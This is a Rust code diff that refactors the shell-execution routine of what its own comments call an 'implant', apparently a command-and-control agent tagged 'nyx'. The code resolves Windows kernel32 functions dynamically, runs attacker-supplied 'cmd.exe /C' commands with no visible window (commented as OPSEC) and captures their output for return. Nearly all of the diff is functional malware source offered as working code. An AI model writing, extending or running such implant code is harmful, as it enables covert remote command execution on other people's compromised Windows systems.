@@ -129,39 +129,103 @@ pub fn run_shell(args: &str) -> Response {
 unsafe fn run_shell_inner(args: &str) -> Response {
     // ---- resolve all 7 kernel32 exports up front ----
     // If any is missing, fail fast rather than transmute a null address.
+    let (create_process, create_pipe, read_file, wait_for_single, _get_exit_code, close_handle, set_handle_info) =
+        match run_shell_inner_resolve() {
+            Ok(fns) => fns,
+            Err(e) => return Response::Err(String::from(e)),
+        };
+
+    // ---- build the pipe: read end stays in the parent, write end goes to child ----
+    let (child_std_out_read, child_std_out_write) =
+        match run_shell_inner_pipe(create_pipe, set_handle_info) {
+            Some(pair) => pair,
+            None => return Response::Err(String::from("shell: CreatePipe failed")),
+        };
+
+    // ---- command line ----
+    let mut cmdline: Vec<u16> = run_shell_inner_cmdline(args);
+
+    // ---- startup info + spawn: redirect stdout+stderr to the pipe write end ----
+    let pi = match run_shell_inner_spawn(
+        create_process,
+        close_handle,
+        child_std_out_read,
+        child_std_out_write,
+        cmdline.as_mut_ptr(),
+    ) {
+        Some(pi) => pi,
+        None => return Response::Err(String::from("shell: CreateProcessW failed")),
+    };
+
+    // ---- drain stdout+stderr ----
+    let (out, capped) = run_shell_inner_drain(read_file, child_std_out_read);
+
+    // ---- reap the child and clean up every handle ----
+    let out = run_shell_inner_reap(wait_for_single, &pi, out, capped);
+    run_shell_inner_finish(_get_exit_code, close_handle, pi, child_std_out_read, out)
+}
+
+/// Resolve all 7 kernel32 exports used by [`run_shell_inner`], in the order
+/// the original function did. Returns the resolved function pointers, or the
+/// exact original `shell: <export> unresolved` message on the first miss.
+///
+/// # Safety
+/// Transmutes raw export addresses into function pointers; every one is used
+/// on kernel handles below.
+unsafe fn run_shell_inner_resolve(
+) -> Result<(CreateProcessW, CreatePipe, ReadFile, WaitForSingleObject, GetExitCodeProcess, CloseHandle, SetHandleInformation), &'static str> {
     let create_process: CreateProcessW = match export_addr(b"kernel32.dll", b"CreateProcessW") {
         Some(a) => core::mem::transmute(a),
-        None => return Response::Err(String::from("shell: CreateProcessW unresolved")),
+        None => return Err("shell: CreateProcessW unresolved"),
     };
     let create_pipe: CreatePipe = match export_addr(b"kernel32.dll", b"CreatePipe") {
         Some(a) => core::mem::transmute(a),
-        None => return Response::Err(String::from("shell: CreatePipe unresolved")),
+        None => return Err("shell: CreatePipe unresolved"),
     };
     let read_file: ReadFile = match export_addr(b"kernel32.dll", b"ReadFile") {
         Some(a) => core::mem::transmute(a),
-        None => return Response::Err(String::from("shell: ReadFile unresolved")),
+        None => return Err("shell: ReadFile unresolved"),
     };
     let wait_for_single: WaitForSingleObject =
         match export_addr(b"kernel32.dll", b"WaitForSingleObject") {
             Some(a) => core::mem::transmute(a),
-            None => return Response::Err(String::from("shell: WaitForSingleObject unresolved")),
+            None => return Err("shell: WaitForSingleObject unresolved"),
         };
     let _get_exit_code: GetExitCodeProcess =
         match export_addr(b"kernel32.dll", b"GetExitCodeProcess") {
             Some(a) => core::mem::transmute(a),
-            None => return Response::Err(String::from("shell: GetExitCodeProcess unresolved")),
+            None => return Err("shell: GetExitCodeProcess unresolved"),
         };
     let close_handle: CloseHandle = match export_addr(b"kernel32.dll", b"CloseHandle") {
         Some(a) => core::mem::transmute(a),
-        None => return Response::Err(String::from("shell: CloseHandle unresolved")),
+        None => return Err("shell: CloseHandle unresolved"),
     };
     let set_handle_info: SetHandleInformation =
         match export_addr(b"kernel32.dll", b"SetHandleInformation") {
             Some(a) => core::mem::transmute(a),
-            None => return Response::Err(String::from("shell: SetHandleInformation unresolved")),
+            None => return Err("shell: SetHandleInformation unresolved"),
         };
+    Ok((
+        create_process,
+        create_pipe,
+        read_file,
+        wait_for_single,
+        _get_exit_code,
+        close_handle,
+        set_handle_info,
+    ))
+}
 
-    // ---- build the pipe: read end stays in the parent, write end goes to child ----
+/// Build the anonymous pipe: read end stays in the parent, write end goes to
+/// the child. Returns `(read, write)` handles, or `None` if CreatePipe failed
+/// (nothing opened yet, nothing to clean up).
+///
+/// # Safety
+/// Calls the resolved kernel32 pipe functions on raw handles.
+unsafe fn run_shell_inner_pipe(
+    create_pipe: CreatePipe,
+    set_handle_info: SetHandleInformation,
+) -> Option<(*mut c_void, *mut c_void)> {
     // SECURITY_ATTRIBUTES.bInheritHandle = TRUE so the write handle is inherited
     // by the child; the read handle is then explicitly marked NON-inheritable
     // below, so only the child holds a write reference. That is what lets
@@ -175,26 +239,19 @@ unsafe fn run_shell_inner(args: &str) -> Response {
     let mut child_std_out_write: *mut c_void = core::ptr::null_mut();
     if create_pipe(&mut child_std_out_read, &mut child_std_out_write, &sa, 0) == 0 {
         // CreatePipe failed — nothing opened yet, nothing to clean up.
-        return Response::Err(String::from("shell: CreatePipe failed"));
+        return None;
     }
     // Mark the READ end non-inheritable. The write end is still inheritable
     // (from sa), which is what CreateProcessW will duplicate into the child.
     set_handle_info(child_std_out_read, HANDLE_FLAG_INHERIT, 0);
+    Some((child_std_out_read, child_std_out_write))
+}
 
-    // ---- startup info: redirect stdout + stderr to the pipe write end ----
-    let mut si: StartupInfoW = core::mem::zeroed();
-    si.cb = core::mem::size_of::<StartupInfoW>() as u32;
-    // STARTF_USESTDHANDLES tells CreateProcessW to use the hStd* handles below
-    // instead of the console. Without this bit the handles are ignored.
-    si.dw_flags = STARTF_USESTDHANDLES;
-    si.h_std_output = child_std_out_write;
-    si.h_std_error = child_std_out_write; // combine stderr into the same stream
-    si.h_std_input = core::ptr::null_mut(); // no stdin; cmd /C rarely needs it
-
-    // ---- command line ----
-    // CreateProcessW may modify lpCommandLine in place (it re-parses the args),
-    // so it must be a WRITABLE buffer. transport.rs's to_utf16 returns an
-    // immutable Vec<u16>; we build our own so we can hand off a *mut u16.
+/// Build the `cmd.exe /C <args>` command line. CreateProcessW may modify
+/// lpCommandLine in place (it re-parses the args), so it must be a WRITABLE
+/// buffer; transport.rs's to_utf16 returns an immutable Vec<u16>, so we build
+/// our own to hand off a `*mut u16`.
+fn run_shell_inner_cmdline(args: &str) -> Vec<u16> {
     let mut cmdline: Vec<u16> = Vec::with_capacity(9 + args.len() + 1);
     // The "cmd.exe /C " prefix is pure ASCII — widen each byte directly.
     cmdline.extend(b"cmd.exe /C ".iter().map(|&b| b as u16));
@@ -202,14 +259,53 @@ unsafe fn run_shell_inner(args: &str) -> Response {
     // through str::encode_utf16 (a core method, available under no_std).
     cmdline.extend(args.encode_utf16());
     cmdline.push(0); // NUL terminator
+    cmdline
+}
 
+/// Build the STARTUPINFO that redirects the child's stdout+stderr to the pipe
+/// write end. STARTF_USESTDHANDLES tells CreateProcessW to use the hStd*
+/// handles below instead of the console; without this bit the handles are
+/// ignored.
+///
+/// # Safety
+/// `core::mem::zeroed()` on a `#[repr(C)]` struct.
+unsafe fn run_shell_inner_startup(child_std_out_write: *mut c_void) -> StartupInfoW {
+    let mut si: StartupInfoW = core::mem::zeroed();
+    si.cb = core::mem::size_of::<StartupInfoW>() as u32;
+    si.dw_flags = STARTF_USESTDHANDLES;
+    si.h_std_output = child_std_out_write;
+    si.h_std_error = child_std_out_write; // combine stderr into the same stream
+    si.h_std_input = core::ptr::null_mut(); // no stdin; cmd /C rarely needs it
+    si
+}
+
+/// Spawn `cmd.exe /C <args>` with stdout+stderr on the pipe write end. On
+/// CreateProcessW failure BOTH pipe ends are closed (the implant is long-lived
+/// and a handle leak per failed shell would exhaust the table over thousands
+/// of cycles). On success the parent's copy of the write end is closed NOW:
+/// the child has its own (inherited) reference, so this does not break it, and
+/// it ensures that once the child finishes and closes its write handle there
+/// are no remaining writers and ReadFile returns 0 (EOF) — without this,
+/// ReadFile would block forever because the parent still holds a write
+/// reference to the pipe.
+///
+/// # Safety
+/// Calls the resolved kernel32 process functions on raw handles.
+unsafe fn run_shell_inner_spawn(
+    create_process: CreateProcessW,
+    close_handle: CloseHandle,
+    child_std_out_read: *mut c_void,
+    child_std_out_write: *mut c_void,
+    cmdline: *mut u16,
+) -> Option<ProcessInformation> {
+    let mut si = run_shell_inner_startup(child_std_out_write);
     let mut pi: ProcessInformation = core::mem::zeroed();
     // lpApplicationName = NULL (cmd.exe resolved via lpCommandLine + PATH).
     // bInheritHandles = TRUE so the write end of the pipe is inherited.
     // dwCreationFlags includes CREATE_NO_WINDOW — no conhost flash (OPSEC).
     let ok = create_process(
         core::ptr::null(),
-        cmdline.as_mut_ptr(),
+        cmdline,
         core::ptr::null(),
         core::ptr::null(),
         1,
@@ -220,22 +316,23 @@ unsafe fn run_shell_inner(args: &str) -> Response {
         &mut pi,
     );
     if ok == 0 {
-        // CreateProcessW failed. Close BOTH pipe ends we opened — the implant
-        // is long-lived and a handle leak per failed shell would exhaust the
-        // table over thousands of cycles.
         close_handle(child_std_out_read);
         close_handle(child_std_out_write);
-        return Response::Err(String::from("shell: CreateProcessW failed"));
+        return None;
     }
-
-    // Close OUR copy of the write end NOW. The child has its own (inherited)
-    // reference, so this does not break it. It does ensure that once the child
-    // finishes and closes its write handle, there are no remaining writers and
-    // ReadFile returns 0 (EOF) — without this, ReadFile would block forever
-    // because the parent still holds a write reference to the pipe.
     close_handle(child_std_out_write);
+    Some(pi)
+}
 
-    // ---- drain stdout+stderr ----
+/// Drain the child's stdout+stderr until EOF or MAX_OUTPUT. Returns the
+/// captured bytes plus `capped` (true once MAX_OUTPUT is reached).
+///
+/// # Safety
+/// Calls the resolved ReadFile on the pipe read handle.
+unsafe fn run_shell_inner_drain(
+    read_file: ReadFile,
+    child_std_out_read: *mut c_void,
+) -> (Vec<u8>, bool) {
     let mut out: Vec<u8> = Vec::new();
     let mut buf = [0u8; 4096];
     let mut capped = false; // true once MAX_OUTPUT is reached
@@ -274,8 +371,22 @@ unsafe fn run_shell_inner(args: &str) -> Response {
             break;
         }
     }
+    (out, capped)
+}
 
-    // ---- reap the child and clean up every handle ----
+/// Reap the child: if the drain hit MAX_OUTPUT the child may still be alive
+/// and blocked writing into the (full) pipe, so terminate it first; then wait
+/// up to SHELL_TIMEOUT and kill a still-hung child, appending the forced-
+/// termination marker to the output.
+///
+/// # Safety
+/// Calls the resolved kernel32 exports on the raw process handle.
+unsafe fn run_shell_inner_reap(
+    wait_for_single: WaitForSingleObject,
+    pi: &ProcessInformation,
+    mut out: Vec<u8>,
+    capped: bool,
+) -> Vec<u8> {
     // If we stopped reading because MAX_OUTPUT was hit, the child may still be
     // alive and blocked writing into the (full) pipe. WaitForSingleObject(INFINITE)
     // would then deadlock (parent waits for child exit, child waits for parent to
@@ -301,6 +412,23 @@ unsafe fn run_shell_inner(args: &str) -> Response {
         }
         out.extend_from_slice(b"\n<nyx: shell command timed out and was killed>\n");
     }
+    out
+}
+
+/// Harvest the child's exit code, close every remaining handle (process +
+/// thread + pipe read — CreateProcessW opened both process handles and the
+/// read end is still ours), and wrap the captured output as
+/// `Response::Output`.
+///
+/// # Safety
+/// Calls the resolved kernel32 exports on the raw process/pipe handles.
+unsafe fn run_shell_inner_finish(
+    _get_exit_code: GetExitCodeProcess,
+    close_handle: CloseHandle,
+    pi: ProcessInformation,
+    child_std_out_read: *mut c_void,
+    out: Vec<u8>,
+) -> Response {
     // Best-effort exit-code harvest (unused today — Response has no exit-code
     // variant), but it documents the resolved GetExitCodeProcess export is live.
     let mut exit_code: u32 = 0;
